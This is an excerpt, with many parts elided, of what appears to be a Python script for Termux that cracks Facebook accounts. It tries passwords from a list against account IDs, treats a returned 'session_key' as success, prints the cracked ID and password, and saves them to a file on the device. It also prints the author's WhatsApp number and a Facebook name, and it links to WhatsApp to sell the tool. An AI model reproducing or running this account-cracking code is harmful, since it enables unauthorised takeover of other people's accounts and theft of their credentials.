...
{50*"-"}
    ...
    Whatsapp : 03429276411
    Facebook : ایک اداس لڑکا
...
def qsbuy():
        try:
                ...
                if str("upppdate") in update:
                        ...
                        os.system(f"termux-open-url https://wa.me/+923429176411?text={bumper}")
                        qsbuy()
...
class crack_main():
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        print(' \033[1;32m[Kashi-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/Kashi_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
        ...
        def pasw(self):
                ...
                print(' Ok Ids Save In : /sdcard/Kashi_ok.txt')
                print(50*'-')
                input('\n Press enter to back ')
                main()
...
datar = []
datar.append(pat)
if '/data/data/com.termux/files/home/Kashi' in datar:
        pass
else:
        for i in range(5000):
